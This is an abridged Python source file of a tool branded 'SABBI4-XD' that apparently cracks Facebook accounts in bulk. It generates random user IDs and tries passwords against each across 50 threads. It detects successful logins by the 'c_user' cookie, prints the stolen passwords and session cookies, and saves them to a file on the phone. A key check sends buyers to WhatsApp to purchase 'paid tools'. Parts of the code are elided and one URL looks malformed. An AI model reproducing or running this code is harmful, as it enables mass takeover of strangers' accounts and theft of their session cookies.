...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[SABBI4-XD')
...
def menu():
	os.system('clear')
	banner()
	_SABBI4_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
	_SABBI4_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
	_SABBI4_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
	_SABBI4_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
	_SABBI4_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
	_____SABBI4_____ = input('\033[1;92m[\033[1;34mðŸ™‚\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____SABBI4_____ in ['1']:
		C1()
	if _____SABBI4_____ in ['2']:
		Y2()
	if _____SABBI4_____ in ['3']:
		BER()
	if _____SABBI4_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100000667784765 ")
	if _____SABBI4_____ in ['0']:
		exit()
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as SABBI4:
        clear()
        tl = str(len(user))      
        ...
        for love in user:
            ...
            uid = code+love
            SABBI4.submit(SABBI4,uid,pwv,tl)
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mSABBI4-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
        	    cek_apk(session,coki)
        	    open('/sdcard/SABBI4-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	else:
        	    continue
        loop+=1
        sys.stdout.write('\r%s[SABBI4-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    ...
    try:
        for ps in pwv:
            ...
            if 'c_user' in log_cookies:
        	    ...
        	    continue
        loop+=1
        sys.stdout.write('\r%s[SABBI4-XD]\033[1;32m-%s/%sSABBI4][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801304683013?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20SABBI4%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://wa.me/+8801304683013/SABBI4/approved.txt/main/approved.%20txt').text
    if key1 in r:
